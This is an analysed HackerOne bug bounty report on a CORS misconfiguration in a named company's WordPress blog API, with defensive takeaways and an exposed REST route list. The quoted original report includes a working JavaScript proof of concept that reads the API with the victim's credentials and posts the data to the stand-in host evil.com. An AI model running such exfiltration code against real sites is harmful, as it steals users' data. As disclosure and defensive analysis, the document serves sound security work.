# Multiple Vulnerabilities in blog.yelp.com - CORS Misconfiguration and Sensitive Data Exposure

## Metadata
- **Source:** HackerOne
- **Report:** 779656 | https://hackerone.com/reports/779656
- **Submitted:** 2020-01-21
- **Reporter:** sourceflow
- **Program:** Yelp
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Origin Resource Sharing (CORS) Misconfiguration, Information Disclosure, Sensitive Data Exposure, Admin Page Disclosure
- **CVEs:** None
- **Category:** business-logic

## Summary
The Yelp blog WordPress REST API endpoint (wp-json/) was vulnerable to CORS misconfiguration, allowing attackers from arbitrary origins to access sensitive API data including admin information and authentication details. The vulnerability combined with exposed WordPress REST routes and admin login page disclosure could enable unauthorized data exfiltration.

## Attack scenario
1. Attacker identifies that blog.yelp.com exposes WordPress REST API endpoints at /wp-json/ without proper CORS restrictions
2. Attacker crafts malicious HTML page with JavaScript that makes cross-origin requests to the vulnerable wp-json endpoint with credentials
3. Victim visits attacker's malicious page while potentially logged into their Yelp blog account
4. Browser executes the JavaScript which makes XMLHttpRequest to https://blog.yelp.com/wp-json/ with withCredentials=true
5. Due to CORS misconfiguration, server accepts request from arbitrary origin and returns sensitive data including user/admin information
6. Attacker's JavaScript exfiltrates the sensitive API response data to attacker-controlled server

## Root cause
WordPress REST API was not properly secured with CORS policies, allowing requests from any origin. The server likely had overly permissive CORS headers (Access-Control-Allow-Origin: *) or failed to validate the Origin header before returning sensitive API data.

## Attacker mindset
Low-skill threat actor performing reconnaissance and basic CORS exploitation. The inclusion of basic JavaScript CORS exploit code suggests opportunistic attacker leveraging publicly known techniques rather than sophisticated adversary.

## Defensive takeaways
- Implement strict CORS policies - whitelist only trusted origins and avoid using wildcard (*)
- Restrict REST API access with authentication requirements and capability checks on sensitive endpoints
- Disable or properly secure WordPress REST API if not needed for frontend functionality
- Implement Content Security Policy (CSP) headers to mitigate cross-origin exploitation
- Regular security audits of WordPress installations and plugin configurations
- Monitor and disable unnecessary REST routes exposed via wp-json discovery
- Apply principle of least privilege to REST API endpoint permissions

## Variant hunting
Check other *.blog.yelp.com subdomains for similar REST API CORS misconfigurations
Enumerate all exposed REST routes for additional sensitive endpoints (redirection, yoast, metaslider plugins)
Test unauthenticated access to administrative REST endpoints
Probe for information disclosure in error messages from REST API responses
Check WordPress user enumeration via /wp-json/wp/v2/users endpoints
Test for CORS bypass techniques (null origin, subdomain manipulation, protocol smuggling)

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1526 - Reconnaissance - Identify and enumerate REST API endpoints
- T1566 - Phishing - Social engineering to visit malicious CORS exploit page
- T1040 - Traffic Sniffing - Exfiltrate data via cross-origin requests
- T1592 - Gather Victim Information - Extract admin/user data via API

## Notes
Report quality is poor with grammatical errors and basic exploit PoC. However, the underlying vulnerability is valid. The exposed administrative plugins (redirection, yoast, metaslider) and REST API logging endpoint present additional attack surface. The report lacks specifics on actual sensitive data returned, making impact assessment difficult. Yelp likely patched by implementing proper CORS headers and REST API access controls.

## Full report
<details><summary>Expand</summary>

**Hi!** Team @yelp, We Found Multiple Vulnerabilities in you websites , Username Admin Login Sensitive Exposure
Refferals Hackerone [#753725]

Platform(s) Affected: [website]
*. https://blog.yelp.com/wp-json/ ``user-admin sensitive exposure``
*. https://blog.yelp.com/wp-login.php ``Admin-Page disclousure``

##Steps To Reproduce:
1) Open URL Vulnerable : https://blog.yelp.com/wp-json/
**Request**
```
GET /wp-json/ HTTP/1.1
Host: blog.yelp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://127.0.0.1:8080
DNT: 1
Connection: close
Cookie: __cfduid=dc46e8e6b98de504f3f044d1b9b3b8a191579632970
Upgrade-Insecure-Requests: 1
```
**Vulnerable Details**
Add Parameter ``Origin`` in Request Header
``Origin`` http://127.0.0.1:8080
**Exploit Cross Origin Resource Sharing Misconfiguration**
```javascript
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from blog.yelp.com about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://blog.yelp.com/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
2) save file as ``.html`` , and open in your browser
3) **Boom** Sensitive has been Exposure

**Additional information**
```javascript
	
name	"Yelp"
description	"Official Blog"
url	"https://blog.yelp.com"
home	"https://blog.yelp.com"
gmt_offset	-8
timezone_string	"America/Los_Angeles"
namespaces	[…]
authentication	[]
routes	
/	{…}
/oembed/1.0	{…}
/oembed/1.0/embed	{…}
/oembed/1.0/proxy	{…}
//wpe_sign_on_plugin/v1	{…}
/wpe_sign_on_plugin/v1/login	{…}
/redirection/v1	{…}
/redirection/v1/redirect	{…}
/redirection/v1/redirect/(?P<id>[\d]+)	{…}
/redirection/v1/bulk/redirect/(?P<bulk>delete|enable|disable|reset)	{…}
/redirection/v1/group	{…}
/redirection/v1/group/(?P<id>[\d]+)	{…}
/redirection/v1/bulk/group/(?P<bulk>delete|enable|disable)	{…}
/redirection/v1/log	{…}
/redirection/v1/bulk/log/(?P<bulk>delete)	{…}
/redirection/v1/404	{…}
/redirection/v1/bulk/404/(?P<bulk>delete)	{…}
/redirection/v1/setting	{…}
/redirection/v1/plugin	{…}
/redirection/v1/plugin/delete	{…}
/redirection/v1/plugin/test	{…}
/redirection/v1/plugin/post	{…}
/redirection/v1/plugin/database	{…}
/redirection/v1/import/file/(?P<group_id>\d+)	{…}
/redirection/v1/import/plugin	{…}
/redirection/v1/import/plugin/(?P<plugin>.*?)	{…}
/redirection/v1/export/(?P<module>1|2|3|all)/(?P<format>csv|apache|nginx|json)	{…}
/yoast/v1	{…}
/yoast/v1/configurator	{…}
/yoast/v1/reindex_posts	{…}
/yoast/v1/ryte	{…}
/yoast/v1/indexables/(?P<object_type>\w+)/(?P<object_id>\d+)	{…}
/yoast/v1/file_size	{…}
/yoast/v1/statistics	{…}
/yoast/v1/myyoast	{…}
/yoast/v1/myyoast/connect	{…}
/wp-rest-api-log	{…}
/wp-rest-api-log/entries	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)	{…}
/wp-rest-api-log/entry	{…}
/wp-rest-api-log/routes	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>body_params)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>query_params)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>body)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>headers)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>response)/(?P<property>body)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>response)/(?P<property>headers)/download	{…}
/metaslider/v1	{…}
/metaslider/v1/slideshow/all	{…}
/metaslider/v1/slideshow/preview	{…}
/metaslider/v1/slideshow/save	{…}
/metaslider/v1/slideshow/delete	{…}
/metaslider/v1/slideshow/duplicate	{…}
/metaslider/v1/themes/all	{…}
/metaslider/v1/themes/custom	{…}
/metaslider/v1/themes/set	{…}
/metaslider/v1/import/images	{…}
/metaslider/v1/tour/status	{…}
/metaslider/v1/settings/save-single	{…}
/metaslider/v1/settings/save-global	{…}
/regenerate-thumbnails/v1	{…}
/regenerate-thumbnails/v1/regenerate/(?P<id>[\d]+)	{…}
/regenerate-thumbnails/v1/attachmentinfo/(?P<id>[\d]+)	{…}
/regenerate-thumbnails/v1/featuredimages	{…}
/wp/v2	{…}
/wp/v2/posts	{…}
/wp/v2/posts/(?P<id>[\d]+)	{…}
/wp/v2/posts/(?P<parent>[\d]+)/revisions	{…}
/wp/v2/posts/(?P<parent>[\d]+)/revisions/(?P<id>[\d]+)	{…}
/wp/v2/posts/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/posts/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/pages	{…}
/wp/v2/pages/(?P<id>[\d]+)	{…}
/wp/v2/pages/(?P<parent>[\d]+)/revisions	{…}
/wp/v2/pages/(?P<parent>[\d]+)/revisions/(?P<id>[\d]+)	{…}
/wp/v2/pages/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/pages/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/media	{…}
/wp/v2/media/(?P<id>[\d]+)	{…}
/wp/v2/blocks	{…}
/wp/v2/blocks/(?P<id>[\d]+)	{…}
/wp/v2/blocks/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/blocks/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/wp-rest-api-log	{…}
/wp/v2/wp-rest-api-log/(?P<id>[\d]+)	{…}
/wp/v2/wp-rest-api-log/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/wp-rest-api-log/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/types	{…}
/wp/v2/types/(?P<type>[\w-]+)	{…}
/wp/v2/statuses	{…}
/wp/v2/statuses/(?P<status>[\w-]+)	{…}
/wp/v2/taxonomies	{…}
/wp/v2/taxonomies/(?P<taxonomy>[\w-]+)	{…}
/wp/v2/categories	{…}
/wp/v2/categories/(?P<id>[\d]+)	{…}
/wp/v2/tags	{…}
/wp/v2/tags/(?P<id>[\d]+)	{…}
/wp/v2/users	{…}
/wp/v2/users/(?P<id>[\d]+)	{…}
/wp/v2/users/me	{…}
/wp/v2/comments	{…}
/wp/v2/comments/(?P<id>[\d]+)	{…}
/wp/v2/search	{…}
/wp/v2/block-renderer/(?P<name>core/block)	{…}
/wp/v2/block-renderer/(?P<name>core/latest-comments)	{…}
/wp/v2/block-renderer/(?P<name>core/archives)	{…}
/wp/v2/block-renderer/(?P<name>core/calendar)	{…}
/wp/v2/block-renderer/(?P<name>core/categories)	{…}
/wp/v2/block-renderer/(?P<name>core/latest-posts)	{…}
/wp/v2/block-renderer/(?P<name>core/rss)	{…}
/wp/v2/block-renderer/(?P<name>core/search)	{…}
/wp/v2/block-renderer/(?P<name>core/shortcode)	{…}
/wp/v2/block-renderer/(?P<name>core/tag-cloud)	{…}
/wp/v2/settings	{…}
/wp/v2/themes	{…}
_links	{…}
```
##POC Screenshots/Videos:
  * F691740
  * F691742
  * F691741

## Impact

1. This website using Wordpress , so developer forget to disable the link that can view information of admin user. By access to this link, attacker can get all username and other information of user admin: Wordpress user admin sensitive-exposure
2. Cross Origin Resource Sharing Misconfiguration

</details>

---
*Analysed by Claude on 2026-05-24*
